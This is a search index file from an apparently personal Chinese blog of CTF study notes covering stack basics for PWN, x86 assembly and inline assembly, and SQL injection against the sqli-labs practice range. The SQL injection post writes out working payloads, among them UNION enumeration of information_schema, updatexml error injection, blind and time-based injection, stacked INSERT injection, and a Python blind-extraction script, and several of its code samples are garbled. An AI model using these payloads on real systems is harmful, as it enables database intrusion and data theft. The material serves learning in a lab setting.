<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>第十二篇博客</title>
      <link href="/2021/08/31/%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/08/31/%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="PWN初步学习"><a href="#PWN初步学习" class="headerlink" title="PWN初步学习"></a>PWN初步学习</h2><h3 id="pwn工具使用"><a href="#pwn工具使用" class="headerlink" title="pwn工具使用"></a>pwn工具使用</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>简介：pwn（拿到计算机的权限）转换为CTF的形式就是拿到题目所给的服务器的权限，然后拿到存储在服务器上的flag。</p><p>大部分情况是通过劫持程序的控制流，使程序执行execve(“/bin/sh”)来拿到服务器的权限。</p><p>Execve可以简单理解为（系统调用）替换当前运行的程序为参数中指明的程序，比如现在就会执行/bin/sh.它是一个shell程序，用于执行命令。</p><p>80386是32位机，以E（EAX）为标志，一个32位寄存器也可以拆分成AX16位，AH高8位，AL低8位。64位机以R为标志，64位机x86-64是对寄存器进行位数扩展，同样也可以拆分。</p><p>在汇编语言的层面一般把数据分为：byte1字节；word2字节；dword4字节；qword8字节。（8位1字节）</p><p>对于pwn来说，要对数据类型比较敏感，因为这里有一种漏洞模型，跟数据类型有关。</p><p>注意一些特殊的指令：cmp+jmp（跳转指令）</p><p>有符号：jge  jle  无符号：jae  jbe</p><p>比较时为有符号数，读取时为无符号数时会读入很大的数据，可能会从而导致溢出。</p><h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>栈（stack）是一块虚拟内存，被计算机标识为stack，用来存储程序运行时候的各种信息，比如说函数的局部变量，caller的栈帧信息，函数的返回地址等。</p><p>栈在内存里是从高地址向低地址生长的，也就是说栈底在内存的高位置，栈顶在内存的低位置。对栈的操作指令有1.push（压栈）2.pop（出栈\弹栈）3.ret（出栈\弹栈）相当于函数的返回指令</p><p>32位下：1.栈内传参 2.保存现场 3.销毁栈帧，返回caller（调用者，被调用者为callee）</p><p>32bit mode：<br>1.根据函数的调用约定，参数从右往左依次入栈。</p><p>2.保存caller的现场，ebp保存 在栈里，call指 令的后一条地址也保存在栈里  </p><p>call fun_ XXX;push ebp;</p><p>3.为called开辟新的栈帧   </p><p>sub esp,xxx;</p><p>4.销毁栈帧<br>leave;ret;<br>leave == mov esp,ebp;pop ebp;<br>ret == pop eip;</p><pre><code>tunc_ 1 (arg3， arg2， arg1) ://从右往左依次入栈    push arq1    push arg2 .    push arg3    call func 1eip next_ instructionfunc 1 :       push ebp;       mov ebp, esp;//j       sub esp, 0x18;       ...       leave .       reteap-&gt;  []       []       []ebp -&gt; ebp       eip       ...</code></pre><p>64位下：1.寄存器传参 2.保存现场 3.销毁栈帧，返回caller</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第十一篇博客</title>
      <link href="/2021/08/16/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/08/16/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="RE初步学习"><a href="#RE初步学习" class="headerlink" title="RE初步学习"></a>RE初步学习</h2><h3 id="X86汇编"><a href="#X86汇编" class="headerlink" title="X86汇编"></a>X86汇编</h3><h4 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h4><p><strong>小分类：</strong></p><p><u>架构小分类</u>：</p><p>intel：x86（32位）、IA64（64位）          AMD：AMD64（64位）</p><p><u>指令集小分类</u>：</p><p>精简指令集（risv）：cpu内部简单，写命令时编程相对复杂一些</p><p>复杂指令集（cisv）：cpu内部复杂，可用简短编程实现功能</p><p>注：Arm（功耗小，一般用于手机）和Mips（一般用于服务器）为以精简指令集为代表的架构</p><h4 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h4><p><u>字节</u>：</p><p>1TB=1024GB=1024^2^MB=1024^3^KB=1024^4^B</p><p><u>总线</u>：</p><p>没有总线，cpu、内存、输入输出设备之间就无法沟通，总线是用来通信的，总线分为地址总线、数据总线和控制总线</p><p><u>串行和并行</u>：</p><p>串行传输：按顺序依次进行传输（一位一位的）</p><p>并行传输：所有一起传输</p><p><u>文本文件编译成可执行程序的过程</u>：</p><p>预编译（头文件和相关宏展开）–编译（将预处理后的文件转换为汇编语言）–汇编（转换为机器语言）–链接（分为动态链接和静态链接，动态链接运行时需去动态库进行调用，程序较大；静态链接则会将所写代码直接编译进去，程序较小）</p><p>注：readlf -s compile.o用于读取s compile.o这个目标文件的发表</p><h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h4><p><u>通用寄存器</u>：</p><table><thead><tr><th>寄存器</th><th>用处</th></tr></thead><tbody><tr><td>al ah ax eax rax</td><td>用处很多，比如存储返回值</td></tr><tr><td>bx</td><td>常在寻址时存储基地址</td></tr><tr><td>dx</td><td>被用来存放整数除法产生的余数</td></tr><tr><td>cx</td><td>常用于控制循环次数</td></tr><tr><td>di</td><td>在变址寻址的时候会使用</td></tr><tr><td>si</td><td>在变址寻址的时候会使用</td></tr><tr><td>bp</td><td>指向当前栈的底部</td></tr><tr><td>sp</td><td>指向当前栈的顶部</td></tr></tbody></table><p>注：寄存器可用于快速存储临时的数据</p><p>al–低八位 ；ah–高八位；ax–十六位；eax–三十二位；rax–六十四位</p><p><u>段寄存器</u>：</p><p>代码段  cs:ip ：存储可运行的代码</p><p>数据段  ds ：存储会用到的数据</p><p>栈段  ss ：存栈的起始基地址</p><p>额外段  es ：备用</p><p>64位下的：FS、GS——不同系统中用处不同，在windows中，GS用于管理线程特定的内存‘Linux中，GS用于访问cpu特定的内存。FS和GS的另一个用处canary保护。</p><p><u>标志寄存器</u>：</p><table><thead><tr><th>eflags</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>OF</td><td>overflos flag</td><td>溢出标志</td><td>溢出标志OF用于反映有符号数加减运算所得结果是否溢出</td></tr><tr><td>DF</td><td>direction flag</td><td>方向标志</td><td>控制串指令（MOVS,CMPS）DF=1，ESI,EDI自动递减（从高地址向低地址放向处理字符串），DF=0,ESI,EDI自动递增</td></tr><tr><td>IF</td><td>interrupt flag</td><td>屏蔽中断标志</td><td></td></tr><tr><td>TF</td><td>trap flag</td><td>单步调试标志</td><td>设置后执行一条指令就会被中断</td></tr><tr><td>SF</td><td>signal flag</td><td>符号标志</td><td>正负标志位，记录相关指令执行后，结果是否为负</td></tr><tr><td>ZF</td><td>zero flag</td><td>零标志</td><td>记录相关指令执行后，结果是否为0；如果结果是0，zf=1，如果结果不为0，zf=0</td></tr><tr><td>AF</td><td>auxiliary carry flag</td><td>辅助进位标志</td><td>运算过程中看最后四位，不论长度为多少。最后四位向前有进位或者借位，AF=1,否则AF=0</td></tr><tr><td>PF</td><td>parity flag</td><td>奇偶标志</td><td>运算结果中“1”的个数的奇偶性，偶数个1，PF=1</td></tr><tr><td>CF</td><td>carry flag</td><td>进位标志</td><td>如果运算结果的最高位产生了一个进位或结尾，其值为1，否则为0</td></tr></tbody></table><h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><p><u>运算指令</u>：</p><p>加   add   add ax,bx<br>减   sub   sub ax,bx<br>乘   mul   mul ax,bx<br>除   div   div ax.bx   商存在ax，余存在dx<br>与   and   and ax,ax<br>或   or   or ax,ax<br>非   not   not ecx<br>异或   xor    xor eax,eax</p><p>左移   shl   逻辑左移 (注意这里是逻辑左移)<br>右移   shr   逻辑右移(注意这里是逻辑右移)</p><p>逻辑移动和算术移动差别在于在不在意符号位，逻辑移动不在意。例子：现在是一个八位数字，最高位是符号位，假设为1，逻辑右移将最高位补充为0，算术右移将最高位补充为1.</p><p><u>赋值指令</u>：</p><p>寄存器寻址：</p><p>mov ax, 0x10（0x10代表16，意味着ax=16）</p><p>mov dx, 0x9   </p><p>mul dx（dx相乘）</p><p>立即数寻址：（可直接在指令中取出所用数，而不用在寄存器中寻找）</p><p>mov ax, 0x18</p><p>基址变址寻址：</p><p>mov[bx+di], ax</p><p>add[bx+si], ax</p><p><u>栈相关指令</u>：（栈与寄存器类似，都为了快速访问，但与堆不同，栈是一块连续的内存，堆中间可能会有空格）</p><p>push   压栈</p><p>pop   弹栈</p><p>Pushfd   把eflags寄存器的内容压入栈</p><p>Popfd   把栈上的内容弹出赋值给eflags寄存器</p><p>Pusha   按照AX、CX、DX、BX、SP（执行PUSHA之前的值）、BP、SI和DI的顺序，将所有16位通用寄存器压入堆栈</p><p>Popa   按照相反顺序将同样的寄存器弹出栈</p><p><u>跳转指令</u>：</p><p>cmp指令   cmp目的操作数，源操作数   目的操作数-源操作数</p><img src="../images/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210829093006384.png" alt="image-20210829093006384" style="zoom: 67%;" /><p>ja和jg都是大于，但ja是无符号进行比较，jg是有符号进行比较</p><p><u>调用函数</u>：</p><p>call   （调用）</p><p>ret    （返回）</p><p>ip = ss*16 + sp</p><p>sp = sp + 2</p><p>retf   （返回，可让32位程序执行64位代码）</p><p>ip = ss * 16 +sp</p><p>sp = sp + 2</p><p>cs = ss * 16 + sp</p><p>sp = sp + 2</p><p><u>内中断、外中断：</u></p><p><u>外部中断</u>：</p><p>外部中断是指来自CPU外部的中断，而外部的中断源必须是某个硬件，所以外部中断又称为硬件中断<br>CPU提供统一的接口作为中断信号的公共线路，所有来自外设的中断信号都共享公共线路连接到CPU，外部硬件的中断通过两根信号线通知CPU的<br>两根信号线分别是INTR(INTeRrupt)和NMI(Non Maskable Interrupt)，示意图如下<br>在CPU上运行的程序都是串行的，串行的意思就是所有任务都是一个接一个在CPU上运行的从INTR引|脚收到的中断都是不影响系统运行的，可以随时处理</p><img src="../images/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210829093928067.png" alt="image-20210829093928067" style="zoom:%;" /><p>从NMI引脚收到的中断。那基本上全是硬伤，CPU都没有运行下去的必要了<br>可屏蔽中断是通过INTR引脚进入CPU的，外部设备如硬盘、网卡等发出的中断都是可屏蔽中断，可屏蔽的意思是此外部设备发出的中断，CPU可以不必理会，因为它不会让系统宕机，所以可以通过eflags寄存器的IF位将所有这些外部设备的中断屏蔽<br>中断处理程序分为上半部和下半部两部分，把中断处理程序中需要立即执行的部分(分分钟不能耽误的部分）划分到上半部，这部分是要限时执行的，所以通常情况下只完成中断应答或硬件复位等重要紧迫的工作。而中断处理程序中那些不紧急的部分则被推迟到下半部中去完成。由于中断处理程序的上半部是刻不容缓要执行的，所以上半部是在关中断不被打扰的情况下执行的。当上半部执行完成后就把中断打开了，下半部也属于中断处理程序，所以中断处理程序下半部则是在开中断的情况下执行的，如果有新的中断发生，原来这个旧中断的下半部就会被换下CPU,先执行新的中断处理程序的上半部，等待线程调度机制为旧中断处理程序择—日期（就是指调度算法认为的某个恰当时机)后，再调度其上CPU 完成其下半部的执行</p><p>不可屏蔽中断是通过NMI引脚进入CPU的，它表示系统中发生了致命的错误，它等同于宜布:计算机的运行到此结束了<br>CPU收到中断后通过中断向量表或中断描述符表(中断向量表是实模式下的中断处理程序数组，在保护模式下已经被中断描述符表代替)来寻找解决方法<br>中断发起时，相应的中断向量号通过NMI或INTR弓|脚被传入CPU,中断向量号是中断向量表或中断描述符表里中断项的下标CPU 根据此中断向量号在中断向量表或中断描述符表中检索对应的中断处理程序并去执行</p><p><u>内中断：</u></p><p>除0错误（0不能作为除数）<br>单步中断–执行一条指令之后就会引起一次中断<br>执行into指令–into这是中断溢出指令，它所触发的中断向量号是4.不过，能否引发4号中断是要看eflags标志寄存器中的OF位是否为1,如果是1才会引发中断，否则什么都不做<br>执行int指令–int 8位立即数通过它进行系统调用，8位立即数可表示256种中断，这与处理器所支持的中断数是相吻合的.<br>异常<br>fault – 可挽救，例如缺页<br>trap (int3)  – 陷阱<br>abort – 遇到不可挽救的错误时终止指令</p><p><u>端口</u>：（可由cpu进行读写的寄存器）</p><p>in指令一般用来从端口读数据，dx存端口号，读的数据存到al或者ax里面，具体是选择al还<br>是ax是根据对应端口指代的寄存器位数来决定的<br>in al, dx<br>in ax, dx<br>out指令一般用来往端口写数据， 同样dx存端口号，与in指令不同的是out指令也可以使用<br>立即数来指明端口号，然后要写入的数据使用al或者ax来存，同样具体是选择al还是ax是根<br>据对应端口指代的寄存器位数来决定的<br>out dx, al<br>out dx,ax<br>out立即数, al<br>out立即数, ax</p><p><u>Intel汇编与AT&amp;T汇编的区别：</u></p><p>x86/amd64汇编指令的两大风格分别是Intel汇编与AT&amp;T汇编，分别被Microsoft Windows/Visual C++与GNU/Gas采用（Gas也可使用Intel汇编风格）：</p><img src="/images/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210831190724948.png" alt="image-20210831190724948" style="zoom:67%;" /><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p><u>内联汇编</u>：</p><p><u>基本内联汇编</u><br>基本内联汇编的格式如下:<br>asm [volatile] (“assembly code”)<br>asm和_ asm_ 是一样的，volatile和_ volatile_ 是一样的，volatile的功能是告诉gcc（编译器）不要修改我写的汇编代码，assembly code表示汇编代码</p><p>assembly code的规则</p><ol><li><p>指令必须用双引号引起来，无论双引号中是一条指令还是多条指令</p></li><li><p>一对双引号不能跨行，如果跨行需要在结尾用反斜杠’\\‘转移</p></li><li><p>指令之间用分号”;”、换行符”\n”或换行符加制表符”\n\t”分隔</p></li></ol><p><u>扩展内联汇编</u><br>格式如下<br>asm  [volatile] (“assembly code” :output : iuput : clobber/modify)<br>output：用来指定汇编代码的数据如何输出给C代码使用<br>input：用来指定C语言中数据如何输入给汇编使用<br>clobber/modify：汇编代码执行后会破坏一些内存或寄存器资源， 通过此项通知编译器，可能造成寄存器或内存数据的破坏，这样gcc就知道哪些寄存器或内存需要提前保护起来</p><p><u>寄存器约束</u><br>寄存器约束就是要求gcc使用哪个寄存器，将input或output中变量约束在某个寄存器<br>中。</p><p>常见的寄存器约束有:</p><p>-a：表示寄存器eax/ax/al<br>-r：表示任意这6个通用寄存器之一: eax/ebx/ecx/edx/esi/edi</p><p>-b：表示寄存器ebx/bx/bl</p><p>-g：表示可以存放到任意地点(寄存器和内存)。相当于除了同q一样外，还可以让gcc安排在内存中<br>-c：表示寄存器ecx/cx/cI<br>-A：把eax和edx组合成64位整数</p><p>-d：表示寄存器edx/dx/dl<br>-f：表示浮点寄存器<br>-D：表示寄存器edi/di</p><p>-t：表示第1个浮点寄存器</p><p>-S：表示寄存器esi/si<br>-u：表示第2个浮点寄存器</p><p>-q：表示任意这4个通用寄存器之一： eax/ebx/ecx/edx</p><p><u>内存约束</u><br>内存约束是要求gcc直接将位于input和output中的C变量的内存地址作为内联汇编代码的操作数，不需要寄存器做中转，直接进行内存读写，也就是汇编代码的操作数是C变量的指针。</p><p>-m：表示操作数可以使用任意一种内存形式。</p><p>-o：操作数为内存变量， 但访问它是通过偏移量的形式访问，即包含offset_address的格<br>式。</p><p><u>立即数约束</u><br>此约束要求gcc在传值的时候不通过内存和寄存器，直接作为立即数传给汇编代码。由于立即数不是变量，只能作为右值，所以只能放在input中。</p><p>-i：表示操作数为整数立即数</p><p>-F：表示操作数为浮点数立即数</p><p>-I： 表示操作数为0<del>31之间的立即数<br>-J：表示操作数为0</del> 63之间的立即数</p><p>-N：表示操作数为0~ 255之间的立即數<br>-O：表示操作数为0~32之间的立即数</p><p>-X：表示操作数为任何类型立即数</p><p><u>通用约束</u><br>0<del>9:此约束只用在input部分，但表示可与output和input中第n个操作数用相同的寄存器或内存。<br><u>序号占位符</u><br>序号占位符是对在output和input中的操作数，按照它们从左到右出现的次序从0开始编号，一直到9，也就是说最多支持10个序号占位符。操作数用在assembly code中，引用它的格式是%0</del>9。</p><p><u>名称占位符</u><br>名称占位符与序号占位符不同，序号占位符靠本身出现在output和input中的位置就能被编译器辨识出来。而名称占位序需要在output 和input中把操作数显式地起个名字，它用这样的格式来标识操作数: [名称]”约束名” (C 变量)这样， 该约束对应的汇编操作数便有了名字，在assembly code中引用操作数时，采用%[名称]的形式就可以了。这次我们用8位除法举例，例如下面这段程序</p><pre><code class="c">#include&lt;stdio.h&gt;void main()&#123;        int in_a=18,in_b=3,out=0;        asm(&quot;divb%[divisor];movb % %al,%[resul]&quot; \           :result]&quot;(out)\           :&quot;a&quot;(in_a),[divisor]&quot;m&quot;(in_b)\             );          pritf(&quot;result is %dn&quot;,out);&#125;</code></pre><p><u>操作数类型修饰符</u><br>在output中有以下3种。<br>=：表示操作数是只写，相当于为output括号中的C变量赋值，如=a(C, _var),此修饰符相当于c_yar= eax.<br>+：表示操作数是可读写的，告诉gcc所约束的寄存器或内存先被读入，再被写入。<br>&amp;：表示此output中的操作数要独占所约束(分配)的寄存器，只供output使用，任何input中所分配的寄存器不能与此相同。注意，当表达式中有多个修饰符时，&amp;要与约束名挨着，不能分隔。<br>在input中:<br>%：该操作数可以和下一个输入操作数互换。</p><p>一般情况下，input 中的C变量是只读的，output 中的C变量是只写的。</p><p>函数原型</p><pre><code>void *memcpy(void*dest,const void *src,size_t n);static void *___memcpy(void *dest, const void *src, size_t n)&#123;        long d0,d1,d2;        asm volatile(                *rep ; movsq\n\t&quot;                *movq%4,%%rcx\n\t&quot;&#39;rep ; movsb\n\t&quot;                :*&quot;=&amp;c&quot;(d0),&quot;= &amp;D&quot;(d1),&quot;=&amp;S&quot;(d2)                :&quot;0&quot;(n&gt;&gt;3),&quot;g&quot;(n&amp;7),&quot;1&quot;(dest),&quot;2&quot;(src)                : &quot;memory&quot;);         return dest;&#125;</code></pre><p>小作业：用汇编语言实现memset函数</p><p>以上引用书籍：</p><p>[1]操作系统真象还原<br>[2]王爽汇编语言<br>[3]维基百科</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第十篇博客</title>
      <link href="/2021/08/14/%E7%AC%AC%E5%8D%81%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/08/14/%E7%AC%AC%E5%8D%81%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="常见注入姿势："><a href="#常见注入姿势：" class="headerlink" title="常见注入姿势："></a>常见注入姿势：</h3><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>联合查询的基本要求：1.查询列数必须一致；2.查询语句的查询的各列类型、顺序最好一致。</p><p>联合查询的步骤：</p><ol><li><p>闭合：</p><p>方法一：使用注释符闭合</p><p>sql语句如下该如何注入：</p><pre><code class="sql">$id = $_GET[&#39;id&#39;];$sql = &quot;select * from data where id =&#39; &quot; . $id .&quot;&#39;&quot;;//引号不配对</code></pre><p>答案是：id=1’#或1’– -</p><p>分析：如果我们只输入一个单引号，原本sql语句中多余的单引号就会导致整个aql语句报错。因此在后面加上#或–来将多余的单引号注释掉。</p><p>方法二：不使用注释符闭合</p><p>sql语句如下：</p><pre><code class="sql">$id = $_GET[&#39;id&#39;];$sql = &quot;select * from data where id = &#39;$id&#39; limit 0,1&quot;;</code></pre><p>答案：id=1’ or ‘1’=’1即构造select * from data where id = ‘1’ or ‘1’=’1’</p><p>注：常见的注释符：%23（#）、–+、；%00、`、……</p><p>方法三：CTF中有时会把常用注释符以及单引号都给ban了，那又该怎么闭合呢？</p><pre><code class="sql">$id = $_GET[&#39;id&#39;];$sql = &quot;select * from data where username= &#39;&quot; .$username .&quot;&#39;and password = &#39;&quot;.$password.&quot;&#39; &quot;;</code></pre><p>答案：通过使用“\”来将$$$username$$后面的单引号转义，然后想办法在$$$password$$部分注释掉后面的单引号即</p><pre><code class="sql">select * from data where username= &#39;\&#39;and password = &#39; or 1=1 ;%00&#39;//&#39;\&#39;and password = &#39;整个为username的值；or 1=1 ;%00为我们输入的password的值，;%00可以用来闭合后面的单引号</code></pre></li><li><p>判断字段数：</p><p> 可以用order by +正整数来进行判断，如果超出表格范围即所选字段大于表格所有则会报错。</p><p>小知识：order by：如果后面接的是整形（从1开始的正整数），则根据第几个字段进行排序。</p></li><li><p>判断结果输出位置</p><p>UNION操作符用于合并两个或多个SELECT语句的结果集</p><p>select * from 表名 where id = ‘-1’ union select 1,2,3；//由于id=-1为空集，因此我们的输入的1，2，3会出现在第一行即username=2，password=3</p><p>select * from 表名 where id = ‘1’ union select 1,2,3；//id=1非空，因此我们的输入的1，2，3会出现在第二行，正常搜索到的在第一行username=Dmub，password=Dumb</p><p>在sqli-labs中，输出的结果字段为2和3，因此我们需要输出结果改变时应更改2和3的值</p><img src="/images/%E7%AC%AC%E5%8D%81%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210816164303527.png" alt="image-20210816164303527" style="zoom: 80%;" /></li><li><p>爆库、爆表、爆列</p><p>TABLE表：提供了关于数据库中的表的信息（包括视图）</p><p>COLUMNS表：提供了表中的列信息即字段数</p><p>table_schema=database()只会搜索当前数据库</p><p>group_concat()函数将结果集整合成一句话输出，其间用逗号隔开</p><p>爆破库名：</p><ul><li>union select 1,2,database()</li></ul><p>爆表名：</p><ul><li>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</li><li> union select 1,2, group_concat(table_name) from information_schema.columns where table_schema=database()</li></ul><p>爆Column名：</p><ul><li>union select 1,2, group_concat(column_name) from information_schema.columns where table_schema=database()</li></ul></li></ol><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。</p><p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p><p>TIPS：<br>1.报错注入有长度限制，不同的函数限制不一样。</p><p>报错注入常用到的函数：（很多函数有版本限制，以下两个函数仅有长度限制，报错注入只允许32位的信息——&gt;突破长度限制方法：分段读取输出或反向读取再正向输出）</p><ol><li><p>Updatexml:史新xml文档的函数。<br>语法: updatexml(文档类型，==xpath路径==，更新的内容)</p><p>例如：<a href="http://localhost/Less-1/?id=-1&#39;">http://localhost/Less-1/?id=-1&#39;</a> and updatexml(0x0a,concat(0x0a,(select database())),-1)–+其中%0x0a相当于换行符，由于第二个0x0a是多余的，因此会报错输出所拼接的database()</p></li><li><p>Extractvalue:对XML文档进行查询的函数<br>语法:extractvalue(文档类型，==xpath路径==)</p></li></ol><p>报错原理:</p><p>路径写入其他格式，就会报错并且会返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容。</p><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p><strong>布尔盲注：</strong></p><p>定义：可以通过网页上两种不同的回显的注入。</p><p>步骤：</p><ol><li>闭合</li><li>找到永真和永假的两种情况</li><li>利用这两种情况进行对数据一位一位的获取</li></ol><p>涉及到的函数：</p><ol><li><p>substr：字符串截取函数</p><p>例子：substr(database(),1,1)，//从第一位开始截，截一位即截取当前数据库的第一位。</p></li><li><p>ascii：把字符转为acsii码</p></li></ol><p><strong>时间盲注：</strong></p><p>定义：</p><p>可以通过时间差导致的两种不同的回显的注入。——&gt;（网页上看不出差别即非布尔盲注）可用Burpsuite进行抓包分析时间来进行进行判断</p><p>涉及到的函数：</p><p>if表达式：IF(expr1,expr2,expr3)：</p><p>如果expr1是TRUE，则IF()的返回值为expr2；否则返回值则为expr3.</p><p>sleep()函数为延迟的时间。例如：sleep(3)为延迟3秒.</p><p>方法：（共五种，以下前两种较为常用）</p><ol><li>简单好用sleep()：找到正确的值时延迟一下</li><li>BENCHMARK：以大量操作进行演示。例如：select benchmark(10000000,sha(1))</li><li>笛卡尔积</li></ol><p><strong>爆破：</strong></p><ol><li><p>手爆：</p><p>思路：</p><ol><li><p>如果不怕累可以手爆</p><p>栗子：</p><p>当前第一位为s（ascii码为115）则?id=1’ and (ascii(substr(database(),1,1))=115)-&gt;时才显示正确输出，手爆过程即将等号后面的数值从1开始一直加一进行测试</p></li><li><p>用burpsuite爆破</p><p>布尔盲注时：burpsuite：intruder–positions–攻击类型（集束炸弹）–更改需要进行爆破的字段的有效负载集和载荷类型。例如：</p><img src="/images/%E7%AC%AC%E5%8D%81%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210816223344841.png" alt="image-20210816223344841" style="zoom:50%;" /><p>而后可根据爆破出的回显长度进行判断。</p></li><li><p>用python脚本</p><p>栗子：sqli-labs第九关</p><pre><code class="python">import stringimport requestsproxies = &#123;    &quot;http&quot; : &quot;http://127.0.0.1:8080&quot;,    &quot;https&quot; : &quot;http://127.0.0.1:8080”&quot;，&#125;session = requests.Session( )if __name__ == &#39; __main___ &#39;:    text =&quot;&quot;    my_list =string.printable    for length in range( 1，50):        for word in my_list:            sql = &quot;database( )&quot;            payload = &quot;1&#39; and if(ascii( substr((%s ),%d,1))=%d ,sleep(2),1) -- “ % (sql,length,ord(word))            paramsGet = i &quot;id&quot; : payload&#125;            headers = &#123; &quot;Sec-Fetch-Site&quot;: &quot;none&quot;,&quot;Sec-Fetch-Dest&quot;:&quot;document&quot;，&quot;Sec-Fetch-User&quot; : &quot;?1&quot;,                        &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;，&quot;Sec-Fetch-Mode&quot;: “navigate&quot;&#125;            try:               response = session.get( &quot;http://localhost/Less-9/&quot;,params=paramsGet,headers=headers,proxies=proxies,                                        timeout=2)except Exception:    text += word    print( text)    break</code></pre></li></ol></li></ol><p><strong>堆叠注入：</strong></p><p>简单理解：</p><p>将前面的语句断掉，再在后面插入自己的逻辑/语句</p><p>例如：</p><p>?id=1’;nsert into users values(‘114’,database(),’hahahaha’);–+//?id=1’;中的分号将前面注释掉了，后面是我们插入的内容，users表中字段分别对应id=114,username=database()查询时显示security,password=hahahaha。</p><h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><p><strong>推荐文章：</strong></p><p><a href="https://www.anquanke.com/post/id/205376">https://www.anquanke.com/post/id/205376</a> SQL注入基础整理及Tricks总结<br><a href="http://yulige.top/?p=80%E9%83%81%E7%A6%BB%E6%AD%8C%E5%B8%88%E5%82%85%E7%9A%84SQLI-LABS%E4%BF%AE%E7%82%BC%E7%AC%94%E8%AE%B0(%E4%B8%80)">http://yulige.top/?p=80郁离歌师傅的SQLI-LABS修炼笔记(一)</a> ( 刷sqli-labs推荐)<br><a href="https://xz.aliyun.com/t/7575">https://xz.aliyun.com/t/7575</a> sql盲注的效率分析</p><p><strong>sql防御方法：</strong></p><p>可利用addcslashes()函数将输出进行过滤，将单引号转义使之无法闭合等</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第九篇博客</title>
      <link href="/2021/08/08/%E7%AC%AC%E4%B9%9D%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2021/08/08/%E7%AC%AC%E4%B9%9D%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB初步学习"><a href="#WEB初步学习" class="headerlink" title="WEB初步学习"></a>WEB初步学习</h2><h3 id="Mysql介绍"><a href="#Mysql介绍" class="headerlink" title="Mysql介绍"></a>Mysql介绍</h3><h4 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h4><p><strong>前置知识：</strong></p><ol><li><p>有编程语言基础，了解php中常见的与mysql相关的函数和类</p></li><li><p>了解 mysql 数据库的一些基本的使用：增删改查</p></li><li><p>知道如何搭建web环境。(windows:推荐使用phpstudy)</p></li><li><p>熟悉python脚本的使用，能够快速生成exp<br><strong>工具：</strong></p></li><li><p>Phpstudy：便于我们快速搭建web环境(在官网<a href="https://www.xp.cn中下载/">https://www.xp.cn中下载</a>)</p><p>在官网中下载phpstudy后打开，在环境的web server中添加套件，建议新手选择阿帕奇Apache。（图中为8.1.0版本）选择数据库版本后可以在设置中配置数据库文件。</p><img src="/images/%E7%AC%AC%E4%B9%9D%E7%AF%87%E5%8D%9A%E5%AE%A2/image-20210811222200141.png" alt="image-20210811222200141" style="zoom: 50%;" /></li><li><p>PhpStorm，Pycharm：用来写代码的。</p></li><li><p> Burpsuite：抓包</p></li><li><p>Sqli-labs：一个sql注入的靶场。地址如下：<a href="https://github.com/Rinkish/Sqli_Edited_Version">https://github.com/Rinkish/Sqli_Edited_Version</a></p></li><li><p>Hackbar:一款谷歌插件，便于我们测试payload。使用开发者模式安装<a 